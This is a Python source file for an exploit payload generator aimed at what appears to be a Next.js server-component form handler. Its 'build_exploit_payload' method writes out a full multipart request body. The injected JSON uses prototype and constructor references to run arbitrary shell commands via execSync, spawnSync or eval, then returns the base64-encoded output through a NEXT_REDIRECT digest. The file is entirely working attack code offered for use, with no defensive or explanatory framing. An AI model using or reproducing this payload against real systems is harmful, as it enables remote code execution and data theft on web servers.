import hashlib
import time

class PayloadGenerator:    
    @staticmethod
    def generate_hash(length=8):
        timestamp = str(time.time()).encode()
        return hashlib.sha256(timestamp).hexdigest()[:length]
    
    @staticmethod
    def sanitize_command(cmd):
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')
    
    @staticmethod
    def parse_command_for_spawn(command):
        """Parse command into executable and args for spawnSync"""
        parts = command.strip().split()
        if not parts:
            return None, []
        executable = parts[0]
        args = parts[1:] if len(parts) > 1 else []
        return executable, args
    
    @staticmethod
    def build_exploit_payload(command, use_eval=False, use_spawn=False):
        safe_cmd = PayloadGenerator.sanitize_command(command)
        
        if use_eval:
            # EXPERIMENTAL: eval-based payload (no child_process spawn)
            injection = (
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
                f'"var res=eval(\'{safe_cmd}\');'
                'var b64=Buffer.from(String(res)).toString(\'base64\');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
                '{digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});","_chunks":"$Q2",'
                '"_formData":{"get":"$1:constructor:constructor"}}}'
            )
        elif use_spawn:
            # spawnSync-based payload (spawns process directly, NO cmd.exe)
            executable, args = PayloadGenerator.parse_command_for_spawn(command)
            safe_exe = PayloadGenerator.sanitize_command(executable)
            safe_args = '[' + ','.join([f"'{PayloadGenerator.sanitize_command(arg)}'" for arg in args]) + ']' if args else '[]'
            
            injection = (
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
                f'"var cp=process.mainModule.require(\'child_process\');'
                f'var res=cp.spawnSync(\'{safe_exe}\',{safe_args},{{shell:false,encoding:\'utf8\'}});'
                'var output=(res.stdout?res.stdout.toString():\'\')+(res.stderr?res.stderr.toString():\'\');'
                'var b64=Buffer.from(output).toString(\'base64\');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
                '{digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});","_chunks":"$Q2",'
                '"_formData":{"get":"$1:constructor:constructor"}}}'
            )
        else:
            # Default: execSync-based payload (spawns child process via cmd.exe)
            injection = (
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
                f'"var res=process.mainModule.require(\'child_process\').execSync(\'{safe_cmd}\')'
                '.toString();var b64=Buffer.from(res).toString(\'base64\');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
                '{digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`});","_chunks":"$Q2",'
                '"_formData":{"get":"$1:constructor:constructor"}}}'
            )
        
        boundary = "----HacxMeBoundaryX9K2pLvN4MqR8TdF"
        
        body_parts = [
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="0"\r\n\r\n',
            f'{injection}\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="1"\r\n\r\n',
            '"$@0"\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="2"\r\n\r\n',
            '[]\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF--\r\n"
        ]
        
        return ''.join(body_parts), boundary

